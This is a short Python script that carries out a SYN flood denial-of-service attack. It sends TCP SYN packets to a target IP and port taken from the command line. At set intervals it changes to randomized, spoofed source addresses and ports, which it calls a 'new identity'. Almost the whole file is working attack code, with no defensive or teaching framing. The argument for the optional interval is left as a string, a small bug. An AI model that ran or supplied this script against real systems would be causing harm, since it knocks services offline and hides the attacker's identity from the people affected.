import sys
from utils import *

def attack(targetIP, targetPort, nb_packet):
    i = 0
    banner()
    print("[+] The DDos SYN FLOOD has begin !")
    print("[*] You're attacking {} on the port {}".format(targetIP,targetPort))
    print("[*] Press Ctrl+C for stop the attack")
    try:
        while 1:
            # Each 100 packets we've send : we changed our identity
            if (i % nb_packet) == 0:
                srcIP = randomIP()
                srcPort = randomPort()
                # Construction du packet à envoyer à la cible
                pkt = Ether(src="88:A8:47:C6:AA:76")/IP(src=srcIP, dst=targetIP)/TCP(sport = srcPort, dport=targetPort, flags='S')
                print("[*] New identity")
            sendp(pkt, verbose=0)
            i+=1

    except KeyboardInterrupt:
        print("You enter Ctrl+C : stopping...")


if len(sys.argv) < 3 or len(sys.argv) > 4:
    usage()
elif len(sys.argv) == 3:
    packet_between_each_change = 100
else:
    packet_between_each_change = sys.argv[3]

targetIP = sys.argv[1]
targetPort = int(sys.argv[2])

attack(targetIP, targetPort, packet_between_each_change)